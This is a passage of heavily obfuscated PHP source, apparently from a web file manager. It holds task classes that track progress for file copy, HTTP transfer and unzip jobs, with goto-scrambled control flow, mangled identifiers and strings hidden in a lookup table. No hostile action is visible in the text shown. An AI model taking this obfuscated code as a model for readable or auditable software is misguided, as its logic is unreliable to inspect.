$c¡â„Ñ†¥[$fªÔÀÓŒáè[1468]] = 0; $c¡â„Ñ†¥[$fªÔÀÓŒáè[1469]] = 0; goto BÓÜ©÷Ê§Œ; B‚ê¢º¶: Hook::bind($fªÔÀÓŒáè[545], array($this, $fªÔÀÓŒáè[1455])); Hook::bind($fªÔÀÓŒáè[511], array($this, $fªÔÀÓŒáè[1456])); Hook::bind($fªÔÀÓŒáè[508], array($this, $fªÔÀÓŒáè[1456])); goto f«§à¿¾¥ã; còØÁ§¾íæ: $c¡â„Ñ†¥[$fªÔÀÓŒáè[1472]] = 0; $c¡â„Ñ†¥[$fªÔÀÓŒáè[1473]] = 0; if (!$c¡â„Ñ†¥[$fªÔÀÓŒáè[1328]]) { $c¡â„Ñ†¥[$fªÔÀÓŒáè[1328]] = LNG($fªÔÀÓŒáè[1474]); } goto F¦®‰»£‡; f«§à¿¾¥ã: Hook::bind($fªÔÀÓŒáè[513], array($this, $fªÔÀÓŒáè[1456])); Hook::bind($fªÔÀÓŒáè[515], array($this, $fªÔÀÓŒáè[1456])); Hook::bind($fªÔÀÓŒáè[517], array($this, $fªÔÀÓŒáè[1456])); goto dÆ—ˆÅ¿¦; dÆ—ˆÅ¿¦: Hook::bind($fªÔÀÓŒáè[1457], array($this, $fªÔÀÓŒáè[1458])); Hook::bind($fªÔÀÓŒáè[534], array($this, $fªÔÀÓŒáè[1459])); $this->sourceModelCopyFlag = !1; goto aÁŠÓ‰‹ªÒ; aÄë™†Ó‰–: $fªÔÀÓŒáè =& $_SERVER[í™]; $c¡â„Ñ†¥ =& $this->task; $this->sourceCopyFolder = !1; goto a¾…¬Û•Ú‰; BÓÜ©÷Ê§Œ: $c¡â„Ñ†¥[$fªÔÀÓŒáè[964]] = $fªÔÀÓŒáè[33]; $c¡â„Ñ†¥[$fªÔÀÓŒáè[1470]] = $fªÔÀÓŒáè[33]; $c¡â„Ñ†¥[$fªÔÀÓŒáè[1471]] = 0; goto còØÁ§¾íæ; a¾…¬Û•Ú‰: Hook::bind($fªÔÀÓŒáè[1447], array($this, $fªÔÀÓŒáè[1448])); Hook::bind($fªÔÀÓŒáè[1449], array($this, $fªÔÀÓŒáè[1450])); Hook::bind($fªÔÀÓŒáè[1451], array($this, $fªÔÀÓŒáè[1452])); goto bëŞ‹Ù³™; bëŞ‹Ù³™: Hook::bind($fªÔÀÓŒáè[541], array($this, $fªÔÀÓŒáè[1453])); Hook::bind($fªÔÀÓŒáè[542], array($this, $fªÔÀÓŒáè[1454])); Hook::bind($fªÔÀÓŒáè[544], array($this, $fªÔÀÓŒáè[1455])); goto B‚ê¢º¶; aÁŠÓ‰‹ªÒ: Hook::bind($fªÔÀÓŒáè[1460], array($this, $fªÔÀÓŒáè[1461])); Hook::bind($fªÔÀÓŒáè[1462], array($this, $fªÔÀÓŒáè[1463])); Hook::bind($fªÔÀÓŒáè[1464], array($this, $fªÔÀÓŒáè[1465])); goto aóĞ®„¥…; F¦®‰»£‡: } protected function endAfter() { goto a¡‡±æè±; eî”ÃïëÆ÷: Hook::unbind($FŒñåë  ç[517], array($this, $FŒñåë  ç[1456])); Hook::unbind($FŒñåë  ç[1457], array($this, $FŒñåë  ç[1458])); Hook::unbind($FŒñåë  ç[534], array($this, $FŒñåë  ç[1459])); goto b©ÏÙ¢İŞš; a¡‡±æè±: $FŒñåë  ç =& $_SERVER[í™]; Hook::unbind($FŒñåë  ç[1447], array($this, $FŒñåë  ç[1448])); Hook::unbind($FŒñåë  ç[1449], array($this, $FŒñåë  ç[1450])); goto DöŠ×¾¬°ï; b©ÏÙ¢İŞš: Hook::unbind($FŒñåë  ç[1460], array($this, $FŒñåë  ç[1461])); Hook::unbind($FŒñåë  ç[1462], array($this, $FŒñåë  ç[1463])); Hook::unbind($FŒñåë  ç[1464], array($this, $FŒñåë  ç[1465])); goto eæéè£îª; AÎ×£¨©Û: Hook::unbind($FŒñåë  ç[544], array($this, $FŒñåë  ç[1455])); Hook::unbind($FŒñåë  ç[545], array($this, $FŒñåë  ç[1455])); Hook::unbind($FŒñåë  ç[511], array($this, $FŒñåë  ç[1456])); goto dµ¨·Á¡…; DöŠ×¾¬°ï: Hook::unbind($FŒñåë  ç[1451], array($this, $FŒñåë  ç[1452])); Hook::unbind($FŒñåë  ç[541], array($this, $FŒñåë  ç[1453])); Hook::unbind($FŒñåë  ç[542], array($this, $FŒñåë  ç[1454])); goto AÎ×£¨©Û; dµ¨·Á¡…: Hook::unbind($FŒñåë  ç[508], array($this, $FŒñåë  ç[1456])); Hook::unbind($FŒñåë  ç[513], array($this, $FŒñåë  ç[1456])); Hook::unbind($FŒñåë  ç[515], array($this, $FŒñåë  ç[1456])); goto eî”ÃïëÆ÷; eæéè£îª: } public function copyMoveStart($BïƒˆáŸ¶å, $f¹¬ÓËáÌ, $f›·©×ëÍÎ, $dµö•ˆ¯¨) { goto EÕ¨ÉÕ¨Ş; EŒ…é††³Á: if (substr($f¹¬ÓËáÌ, 0, strlen($f‰„±×ÅŸ)) == $f‰„±×ÅŸ) { return; } if (substr($dµö•ˆ¯¨, 0, strlen($f‰„±×ÅŸ)) == $f‰„±×ÅŸ) { return; } $a£¦³ÈĞ‹Ù =& $this->task; goto bˆ»Õ÷ÙÂå; EÕ¨ÉÕ¨Ş: $BÇìÄì¤® =& $_SERVER[í™]; self::log($BÇìÄì¤®[1475] . $f¹¬ÓËáÌ . $BÇìÄì¤®[66] . $dµö•ˆ¯¨); $f‰„±×ÅŸ = rtrim(TEMP_FILES, $BÇìÄì¤®[8]); goto EŒ…é††³Á; bˆ»Õ÷ÙÂå: $a£¦³ÈĞ‹Ù[$BÇìÄì¤®[1476]] = KodIO::transferType($BïƒˆáŸ¶å, $f›·©×ëÍÎ); $this->update(); goto Eí¶¡˜Âîñ; Eí¶¡˜Âîñ: } public function updateAfter() { goto Dâ÷ù±Ò¾; Dâ÷ù±Ò¾: $BÒÎãš˜„± =& $_SERVER[í™]; $eŒíåè¬ÏÓ =& $this->task; if (!$eŒíåè¬ÏÓ[$BÒÎãš˜„±[680]]) { return; } goto A®«Š™Æå; A®«Š™Æå: if ($this->sourceModelCopyFlag) { return; } if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1476]] == $BÒÎãš˜„±[1080]) { return; } if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1476]] == $BÒÎãš˜„±[1026] || $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1476]] == $BÒÎãš˜„±[103]) { if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1470]]) { $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1473]] = $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1472]] + $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1469]]; } } else { if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1476]] == $BÒÎãš˜„±[1081]) { if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1470]] == $BÒÎãš˜„±[1026]) { $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1473]] = $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1472]] + $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1469]] * 0.5; } else { if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1470]] == $BÒÎãš˜„±[103]) { $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1473]] = $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1472]] + $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1468]] * 0.5 + $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1469]] * 0.5; } } } } goto f©Ä‚†Š†; f©Ä‚†Š†: $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1424]] = $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1473]] / $eŒíåè¬ÏÓ[$BÒÎãš˜„±[680]]; if ($eŒíåè¬ÏÓ[$BÒÎãš˜„±[1424]] > 0) { $F»ÑÆŞ •˜ = timeFloat() - $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1426]] - $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1429]]; $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1430]] = $F»ÑÆŞ •˜ * (1 - $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1424]]) / $eŒíåè¬ÏÓ[$BÒÎãš˜„±[1424]]; } goto fÛ¨…‹‹â; fÛ¨…‹‹â: } public function addPath($DÓ®ÜõˆÁ±) { goto B¦ÄÇº“Ş; B¦ÄÇº“Ş: $aÎÍåñÉ… =& $_SERVER[í™]; if (!$DÓ®ÜõˆÁ±) { return; } $A×¢¤±êô± =& $this->task; goto CÄ½Â÷–¼; aÒæé—Õ¢„: if ($DŞèÂÒ‘íî[$aÎÍåñÉ…[29]] == $aÎÍåñÉ…[167]) { $A×¢¤±êô±[$aÎÍåñÉ…[962]] += 1; } else { $A×¢¤±êô±[$aÎÍåñÉ…[962]] += $DŞèÂÒ‘íî[$aÎÍåñÉ…[80]][$aÎÍåñÉ…[78]]; if ($DŞèÂÒ‘íî[$aÎÍåñÉ…[369]]) { $A×¢¤±êô±[$aÎÍåñÉ…[962]] += $DŞèÂÒ‘íî[$aÎÍåñÉ…[80]][$aÎÍåñÉ…[79]] + 1; } } $A×¢¤±êô±[$aÎÍåñÉ…[680]] += $DŞèÂÒ‘íî[$aÎÍåñÉ…[77]]; $this->update(); goto B¦õ©±ôÉª; CÄ½Â÷–¼: $DŞèÂÒ‘íî = IO::infoWithChildren($DÓ®ÜõˆÁ±); $C“¥ßõØ½ƒ = $A×¢¤±êô±[$aÎÍåñÉ…[1477]] ? $A×¢¤±êô±[$aÎÍåñÉ…[1477]][$aÎÍåñÉ…[1478]] : 0; $A×¢¤±êô±[$aÎÍåñÉ…[1477]] = array($aÎÍåñÉ…[1478] => $C“¥ßõØ½ƒ + 1, $aÎÍåñÉ…[386] => $DŞèÂÒ‘íî[$aÎÍåñÉ…[28]], $aÎÍåñÉ…[75] => $DŞèÂÒ‘íî[$aÎÍåñÉ…[75]], $aÎÍåñÉ…[468] => $DŞèÂÒ‘íî[$aÎÍåñÉ…[468]] ? $DŞèÂÒ‘íî[$aÎÍåñÉ…[468]] : $DŞèÂÒ‘íî[$aÎÍåñÉ…[75]]); goto aÒæé—Õ¢„; B¦õ©±ôÉª: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($A„µŞ²¨ ) { $eÚ±»™õÁó =& $_SERVER[í™]; $B­†°çŸæŸ =& $this->task; $B­†°çŸæŸ[$eÚ±»™õÁó[1466]] = $A„µŞ²¨ [$eÚ±»™õÁó[28]]; $B­†°çŸæŸ[$eÚ±»™õÁó[964]] = $A„µŞ²¨ [$eÚ±»™õÁó[28]]; $this->update(); } public function copyFileStart($dçæ¶õÊ£“, $f¹ï¹Ê…, $dºâ§ªİ´ˆ, $b§¡ƒ†®©î, $AÇ«ŠÎ™ÇÓ, $cÁÎ×»š¨µ) { goto D›¦ä´ÈæÀ; dµ’ÛÀ»¦: $GLOBALS[$CÖŒõë‚ÙÙ[1480]] = $AÇ«ŠÎ™ÇÓ; $GLOBALS[$CÖŒõë‚ÙÙ[1479]] = $cÁÎ×»š¨µ; $a¸¹½ÏÈá¤ =& $this->task; goto E¥§¶‘ºã‹; D›¦ä´ÈæÀ: $CÖŒõë‚ÙÙ =& $_SERVER[í™]; $Eçøõ™·ø = $AÇ«ŠÎ™ÇÓ; if ($Eçøõ™·ø == $GLOBALS[$CÖŒõë‚ÙÙ[1479]]) { $Eçøõ™·ø = $GLOBALS[$CÖŒõë‚ÙÙ[1480]]; } goto dµ’ÛÀ»¦; Eäêáƒ…: $this->update(); goto eÆÅä¤‚áØ; E¥§¶‘ºã‹: $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[1466]] = $Eçøõ™·ø; $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[1468]] = (int) $dçæ¶õÊ£“->size($f¹ï¹Ê…); $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[1469]] = 0; goto eÏç¸„ÈÂÜ; eÏç¸„ÈÂÜ: $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[964]] = $CÖŒõë‚ÙÙ[33]; $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[1470]] = $CÖŒõë‚ÙÙ[33]; $a¸¹½ÏÈá¤[$CÖŒõë‚ÙÙ[1471]] = 0; goto Eäêáƒ…; eÆÅä¤‚áØ: } public function copyFileEnd($f»¦¨‘•ÄÕ, $b ê§ªŠ†ô, $fÖå÷Šø‘°, $AáâšèŠ˜, $F†’ì·¶Õ‰, $EöŠ­ô‹â) { $Bİ°•©ĞÑ =& $_SERVER[í™]; $eŞ Ö‘ƒ¹ =& $this->task; $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1469]] = $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1468]]; $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1470]] = $Bİ°•©ĞÑ[33]; if ($F†’ì·¶Õ‰ == $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1466]]) { $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1472]] += $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1468]]; $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1473]] = $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1472]]; $this->update(1); } else { $this->update(); $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1469]] = 0; } self::log($Bİ°•©ĞÑ[1481] . $b ê§ªŠ†ô . $Bİ°•©ĞÑ[66] . $AáâšèŠ˜ . $Bİ°•©ĞÑ[217] . $F†’ì·¶Õ‰ . $Bİ°•©ĞÑ[1482] . $eŞ Ö‘ƒ¹[$Bİ°•©ĞÑ[1466]]); } public function updateFileEnd($A¿‡Î©’ÊÊ, $D±Ù‰ğ©Ìğ) { goto bÅ›½‹—Ì÷; bÅ›½‹—Ì÷: $dò‡Ì¬¦– =& $_SERVER[í™]; $FÙ®»“âñì =& $this->task; $FÙ®»“âñì[$dò‡Ì¬¦–[1466]] = $A¿‡Î©’ÊÊ; goto aø²Ç§¾Ô¦; aø²Ç§¾Ô¦: $FÙ®»“âñì[$dò‡Ì¬¦–[1468]] = $D±Ù‰ğ©Ìğ; $FÙ®»“âñì[$dò‡Ì¬¦–[1472]] += $D±Ù‰ğ©Ìğ; $FÙ®»“âñì[$dò‡Ì¬¦–[1473]] = $FÙ®»“âñì[$dò‡Ì¬¦–[1472]]; goto F‘ˆíÇ“õõ; F‘ˆíÇ“õõ: $this->update(1); self::log($dò‡Ì¬¦–[1483] . $A¿‡Î©’ÊÊ); goto dÁÊ„ÀÆñ; dÁÊ„ÀÆñ: } public function sourceModelCopy($c¨¯•¢ôİ©) { goto dÛ»‘ŞíùÀ; e¼¤Ä¹¢: $Dëãà‹´‡á =& $this->task; $this->sourceModelCopyFlag = !0; $DÚìè…“™ = 0; goto A¼ù‚š† Â; dÛ»‘ŞíùÀ: $Cê™ÄóÙ‰â =& $_SERVER[í™]; $aËÏåºÍõ„ = $c¨¯•¢ôİ©[0]; $F£ù¡öŠ°¹ = $c¨¯•¢ôİ©[1]; goto e¼¤Ä¹¢; A¼ù‚š† Â: switch ($aËÏåºÍõ„) { case $Cê™ÄóÙ‰â[509]: $DÚìè…“™ = 1; break; case $Cê™ÄóÙ‰â[512]: $Dëãà‹´‡á[$Cê™ÄóÙ‰â[1466]] = $F£ù¡öŠ°¹[$Cê™ÄóÙ‰â[28]]; break; case $Cê™ÄóÙ‰â[514]: $DÚìè…“™ = intval($c¨¯•¢ôİ©[$Cê™ÄóÙ‰â[363]] * 0.4); break; case $Cê™ÄóÙ‰â[516]: $DÚìè…“™ = intval($c¨¯•¢ôİ©[$Cê™ÄóÙ‰â[363]] * 0.2); break; case $Cê™ÄóÙ‰â[518]: $DÚìè…“™ = intval($c¨¯•¢ôİ©[$Cê™ÄóÙ‰â[363]] * 0.4); break; } $this->update($DÚìè…“™); $this->sourceModelCopyFlag = !1; goto FÌÏŠÑ®—­; FÌÏŠÑ®—­: } public function sourceRemove($AÜ¡Šæ×‰î, $bàŠ’Ë©ˆ) { $dÓ±¤òñËÑ =& $_SERVER[í™]; $this->sourceModelCopyFlag = !0; $D˜¨İ½œ ì = 1; if (isset($AÜ¡Šæ×‰î[$dÓ±¤òñËÑ[80]])) { $D˜¨İ½œ ì = $AÜ¡Šæ×‰î[$dÓ±¤òñËÑ[80]][$dÓ±¤òñËÑ[78]] + $AÜ¡Šæ×‰î[$dÓ±¤òñËÑ[80]][$dÓ±¤òñËÑ[79]] + 1; } $this->update($D˜¨İ½œ ì); $this->sourceModelCopyFlag = !1; } public function sourceMove($dÊŸğößÌÜ) { $this->sourceRemove($dÊŸğößÌÜ, !1); } public function curlProgress($CÅ²³ é², $fœ‰µ´ÄÑ, $cŒÊ®÷Õ«, $b·¤ë„åÃĞ, $b¶Œ¤œ‘‹ó) { $f’öÍ “ä‘ =& $_SERVER[í™]; $A¶­ÓÍÃŒË =& $this->task; if ($b¶Œ¤œ‘‹ó > 0) { $A¶­ÓÍÃŒË[$f’öÍ “ä‘[964]] = $f’öÍ “ä‘[1484]; $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1470]] = $f’öÍ “ä‘[103]; if ($A¶­ÓÍÃŒË[$f’öÍ “ä‘[1468]] == $b·¤ë„åÃĞ || $b·¤ë„åÃĞ > 1024 * 1024) { $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1469]] = $b¶Œ¤œ‘‹ó; } if ($A¶­ÓÍÃŒË[$f’öÍ “ä‘[1471]]) { $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1469]] = $b¶Œ¤œ‘‹ó + $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1471]]; } } else { if ($cŒÊ®÷Õ« > 0) { if ($A¶­ÓÍÃŒË[$f’öÍ “ä‘[1468]] == $fœ‰µ´ÄÑ) { $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1469]] = $cŒÊ®÷Õ«; $A¶­ÓÍÃŒË[$f’öÍ “ä‘[964]] = $f’öÍ “ä‘[1485]; $A¶­ÓÍÃŒË[$f’öÍ “ä‘[1470]] = $f’öÍ “ä‘[1026]; } } } $this->update(); } public function curlProgressStart($aòè…´­Ï—) { } public function curlProgressEnd($fÅ±Şø’Ã) { $déÕõ¤‚›¤ =& $_SERVER[í™]; $a¹Ï’çØ =& $this->task; $a÷Šã×ìÇ = curl_getinfo($fÅ±Şø’Ã); $BøÜÎé®âµ = $a÷Šã×ìÇ[$déÕõ¤‚›¤[1486]]; if ($a¹Ï’çØ[$déÕõ¤‚›¤[1470]] == $déÕõ¤‚›¤[103] && $BøÜÎé®âµ) { $a¹Ï’çØ[$déÕõ¤‚›¤[1471]] += $BøÜÎé®âµ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $D¿Ÿ›Æİ‰ =& $_SERVER[í™]; $cíËŠ…®§á =& $this->task; $cíËŠ…®§á[$D¿Ÿ›Æİ‰[1487]] = 1; Hook::bind($D¿Ÿ›Æİ‰[1460], array($this, $D¿Ÿ›Æİ‰[1488])); Hook::bind($D¿Ÿ›Æİ‰[1462], array($this, $D¿Ÿ›Æİ‰[1489])); Hook::bind($D¿Ÿ›Æİ‰[1464], array($this, $D¿Ÿ›Æİ‰[1490])); } protected function endAfter() { $F‹ôŸƒ¡„¾ =& $_SERVER[í™]; Hook::unbind($F‹ôŸƒ¡„¾[1460], array($this, $F‹ôŸƒ¡„¾[1488])); Hook::unbind($F‹ôŸƒ¡„¾[1462], array($this, $F‹ôŸƒ¡„¾[1489])); Hook::unbind($F‹ôŸƒ¡„¾[1464], array($this, $F‹ôŸƒ¡„¾[1490])); } public function progressStart($c‚ŞÛ‡Ö¬É) { $a¨ˆÏˆŞ­¦ =& $_SERVER[í™]; $cÓ¢ïÍå°æ = curl_getinfo($c‚ŞÛ‡Ö¬É); self::log($a¨ˆÏˆŞ­¦[1491] . $cÓ¢ïÍå°æ[$a¨ˆÏˆŞ­¦[295]]); self::valueSet($this->task[$a¨ˆÏˆŞ­¦[367]], $this->task); } public function progressEnd($F„†ÑæÖš›) { $EõÔŸÅÓ­¹ =& $_SERVER[í™]; self::log($EõÔŸÅÓ­¹[1492] . $this->task[$EõÔŸÅÓ­¹[367]]); $this->end(); } public function progress($eÎÆ·²Åæ¹, $BÙäÇòºœƒ, $Dìë°ôœŠ, $Dò‘‹®í—‡, $Bñ¶À­»‚š) { $F”‹“¶â‚È =& $_SERVER[í™]; $EÃÕËˆÃõÉ =& $this->task; if ($Bñ¶À­»‚š > 0) { $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]] = $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]] == 0 ? $Dò‘‹®í—‡ : $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]]; $EÃÕËˆÃõÉ[$F”‹“¶â‚È[976]] = $Bñ¶À­»‚š; } else { if ($Dìë°ôœŠ > 0) { $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]] = $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]] == 0 ? $BÙäÇòºœƒ : $EÃÕËˆÃõÉ[$F”‹“¶â‚È[962]]; $EÃÕËˆÃõÉ[$F”‹“¶â‚È[976]] = $Dìë°ôœŠ; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\x73\163\110\x74\164\160\72\x64\157\167\x6e\72{$Dìë°ôœŠ}\x2f{$BÙäÇòºœƒ}\x3b\40\x75\160\154\x6f\x61\x64\72{$Bñ¶À­»‚š}\57{$Dò‘‹®í—‡}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bÔœˆÅØ‹ù; C¸¤ì–‡í: Hook::bind($c¨‡÷¼Ü¤[1021], array($this, $c¨‡÷¼Ü¤[1495])); $A…ÛƒÙŒóÆ =& $this->task; $A…ÛƒÙŒóÆ[$c¨‡÷¼Ü¤[1496]] = $c¨‡÷¼Ü¤[1026]; goto D‹­¿…Äñº; D‹­¿…Äñº: if (!$A…ÛƒÙŒóÆ[$c¨‡÷¼Ü¤[1328]]) { $A…ÛƒÙŒóÆ[$c¨‡÷¼Ü¤[1328]] = LNG($c¨‡÷¼Ü¤[1497]); } goto dÎµàö„ğÆ; bÔœˆÅØ‹ù: $c¨‡÷¼Ü¤ =& $_SERVER[í™]; parent::startAfter(); Hook::bind($c¨‡÷¼Ü¤[1493], array($this, $c¨‡÷¼Ü¤[1494])); goto C¸¤ì–‡í; dÎµàö„ğÆ: } protected function endAfter() { $aøò¥§êĞÛ =& $_SERVER[í™]; parent::endAfter(); Hook::unbind($aøò¥§êĞÛ[1493], array($this, $aøò¥§êĞÛ[1494])); Hook::unbind($aøò¥§êĞÛ[1021], array($this, $aøò¥§êĞÛ[1495])); } public function updateAfter() { $EŒš‹óŸ‚¿ =& $_SERVER[í™]; $B¶ŒÏ×Ì…¯ =& $this->task; if (!$B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[962]] || !$B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[680]]) { return; } if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1496]] == $EŒš‹óŸ‚¿[1026]) { $d‰¤…ğ¼Âì = 0; if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1468]]) { $d‰¤…ğ¼Âì = $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1469]] / $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1468]]; } $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]] = $d‰¤…ğ¼Âì * 0.3; } else { if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1496]] == $EŒš‹óŸ‚¿[301]) { $d‰¤…ğ¼Âì = $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[976]] / $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[962]]; $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]] = 0.3 + $d‰¤…ğ¼Âì * 0.4; } else { if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1496]] == $EŒš‹óŸ‚¿[103]) { $dÖ’£©“êª = 0; if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1470]] == $EŒš‹óŸ‚¿[103]) { $dÖ’£©“êª = $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1469]]; } $d‰¤…ğ¼Âì = ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1473]] + $dÖ’£©“êª) / $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[680]]; $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]] = 0.3 + 0.4 + $d‰¤…ğ¼Âì * 0.3; } } } if ($B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]] > 0) { $C¬Ç«•œµè = timeFloat() - $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1426]] - $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1429]]; $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1430]] = $C¬Ç«•œµè * (1 - $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]]) / $B¶ŒÏ×Ì…¯[$EŒš‹óŸ‚¿[1424]]; } } public function addFile($bğÄ²‘Ã‡‹) { goto fö¨¢­áéµ; eß®§áàÙõ: $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[964]] = $C’´¬ñ¼Ã¯[1485]; $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[1470]] = $C’´¬ñ¼Ã¯[1026]; $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[680]] = $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[77]]; goto A„õ­èÁç; fö¨¢­áéµ: $C’´¬ñ¼Ã¯ =& $_SERVER[í™]; $fœ¬‹ã¸å£ =& $this->task; $aƒÍ„‰è¯ = IO::info($bğÄ²‘Ã‡‹); goto E³™ô¿‘¯É; E³™ô¿‘¯É: $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[1466]] = $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[28]]; $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[1468]] = $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[77]]; $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[1469]] = 0; goto eß®§áàÙõ; A„õ­èÁç: $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[962]] = 1; $d³–ÌÚÈÜô = 0; $fœ¬‹ã¸å£[$C’´¬ñ¼Ã¯[1477]] = array($C’´¬ñ¼Ã¯[1478] => $d³–ÌÚÈÜô + 1, $C’´¬ñ¼Ã¯[386] => $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[28]], $C’´¬ñ¼Ã¯[75] => $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[75]], $C’´¬ñ¼Ã¯[468] => $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[468]] ? $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[468]] : $aƒÍ„‰è¯[$C’´¬ñ¼Ã¯[75]]); goto EßˆŸ£©‘Ó; EßˆŸ£©‘Ó: $this->update(); goto bºÆ§…‡Ïî; bºÆ§…‡Ïî: } public function unzipAfter($BÓØ©—ÁŒ) { goto FÅèÉ²Ó¸ç; d£¤µ…†‘£: $b±Ó¼Šé‰’ = IO::infoWithChildren($BÓØ©—ÁŒ); $a‘±´Ü½†È = 0; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1477]] = array($C“öˆˆó¶˜[1478] => $a‘±´Ü½†È + 1, $C“öˆˆó¶˜[386] => $b±Ó¼Šé‰’[$C“öˆˆó¶˜[28]], $C“öˆˆó¶˜[75] => $b±Ó¼Šé‰’[$C“öˆˆó¶˜[75]], $C“öˆˆó¶˜[468] => $b±Ó¼Šé‰’[$C“öˆˆó¶˜[468]] ? $b±Ó¼Šé‰’[$C“öˆˆó¶˜[468]] : $b±Ó¼Šé‰’[$C“öˆˆó¶˜[75]]); goto fÎªËÓêŞ; d¥‰İšõ²œ: $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1466]] = $C“öˆˆó¶˜[33]; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1473]] = 0; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[680]] = $b±Ó¼Šé‰’[$C“öˆˆó¶˜[77]]; goto cçÙ·ÖÙå¥; fÎªËÓêŞ: if ($b±Ó¼Šé‰’[$C“öˆˆó¶˜[29]] == $C“öˆˆó¶˜[167]) { $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[962]] = 1; } else { $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[962]] = $b±Ó¼Šé‰’[$C“öˆˆó¶˜[80]][$C“öˆˆó¶˜[78]]; } $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[964]] = $C“öˆˆó¶˜[33]; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1470]] = 0; goto Bİ¿ÊïŒ¶İ; FÅèÉ²Ó¸ç: $C“öˆˆó¶˜ =& $_SERVER[í™]; $Cåé©ÂÀ‚³ =& $this->task; $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[1496]] = $C“öˆˆó¶˜[103]; goto d£¤µ…†‘£; Bİ¿ÊïŒ¶İ: $Cåé©ÂÀ‚³[$C“öˆˆó¶˜[976]] = 0; 